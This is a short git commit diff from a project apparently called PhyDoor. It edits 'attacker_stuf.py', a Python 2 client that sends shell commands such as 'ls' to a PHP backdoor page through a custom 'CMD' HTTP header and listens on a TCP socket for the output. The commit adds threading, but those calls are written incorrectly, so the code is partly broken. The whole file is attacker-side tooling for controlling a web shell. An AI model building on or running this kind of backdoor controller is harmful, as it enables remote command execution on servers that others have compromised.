c26eebbaf7c1b0bf375ba51515e8691bd9c417cc
shoxxdj <dj.shoxx.dj@gmail.com>
2014-11-24 12:07:51 +0100

    Try Threading

--- PhyDoor.py/attacker_stuf.py
+++ PhyDoor.py/attacker_stuf.py
@@ -1,7 +1,22 @@
 import requests
 import socket
 import time
+import thread
 
-headers={'CMD':'ls'}
 
-r =requests.get('http://localhost/lala.php',headers=headers)
+def send_command():
+	headers={'CMD':'ls'}
+	r =requests.get('http://localhost/lala.php',headers=headers)
+	print r.text
+
+def listen():
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(("localhost",1223))
+	data = s.recv(1024)
+	s.close()
+	print data
+
+thread.start_new_thread(send_command())
+thread.start_new_thread(listen())
+
+
